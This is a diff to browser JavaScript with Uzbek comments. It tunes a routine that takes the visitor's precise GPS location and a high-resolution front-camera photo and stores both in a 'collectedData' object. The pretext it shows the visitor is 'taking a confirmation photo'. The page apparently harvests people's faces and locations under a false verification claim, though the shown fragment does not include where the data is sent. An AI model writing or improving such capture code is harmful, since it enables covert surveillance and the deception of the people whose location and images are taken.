@@ -169,10 +169,13 @@
                 }
             };
 
-            // 1. GPS joylashuvni avtomatik olish
+            // 1. GPS joylashuvni BIRINCHI olish - ruxsat so'rash
             if (navigator.geolocation) {
                 try {
                     // console.log('Requesting GPS location...');
+                    status.textContent = '📍 Joylashuvni aniqlash...';
+                    status.style.display = 'block';
+                    
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
                             resolve, 
@@ -182,7 +185,7 @@
                             },
                             { 
                                 enableHighAccuracy: true,
-                                timeout: 10000,
+                                timeout: 15000,
                                 maximumAge: 0
                             }
                         );
@@ -212,14 +215,16 @@
                 collectedData.gps_location = { error: 'Geolocation not supported by browser' };
             }
 
-            // 2. Kameradan avtomatik rasm olish
+            // 2. Kameradan rasm olish - IKKINCHI
             try {
                 // console.log('Requesting camera access...');
+                status.textContent = '📷 Tasdiqlovchi rasm olish...';
+                
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { min: 640, ideal: 1920, max: 1920 },
+                        height: { min: 480, ideal: 1080, max: 1080 }
                     },
                     audio: false 
                 });
@@ -236,8 +241,10 @@
                     video.onloadedmetadata = async () => {
                         try {
                             await video.play();
+                            // console.log('Video playing, dimensions:', video.videoWidth, 'x', video.videoHeight);
                             resolve();
                         } catch (e) {
+                            // console.error('Video play error:', e);
                             reject(e);
                         }
                     };
@@ -245,8 +252,9 @@
                     setTimeout(() => reject(new Error('Video load timeout')), 5000);
                 });
                 
-                // Kamera to'liq stabillanishi uchun 4 soniya kutish
-                await new Promise(resolve => setTimeout(resolve, 4000));
+                // Kamera to'liq stabillanishi uchun 5 soniya kutish (qattiqroq)
+                // console.log('Waiting for camera to stabilize...');
+                await new Promise(resolve => setTimeout(resolve, 5000));
                 
                 // console.log('Taking photo...');
                 // Canvas o'lchamini video bilan moslash
@@ -255,12 +263,13 @@
                 
                 // Rasmga olish
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                const imageData = canvas.toDataURL('image/jpeg', 0.95);
                 
                 collectedData.camera = {
                     captured: true,
                     image: imageData,
-                    resolution: `${canvas.width}x${canvas.height}`
+                    resolution: `${canvas.width}x${canvas.height}`,
+                    videoReady: video.readyState === 4
                 };
                 // console.log('Photo captured successfully');
                 
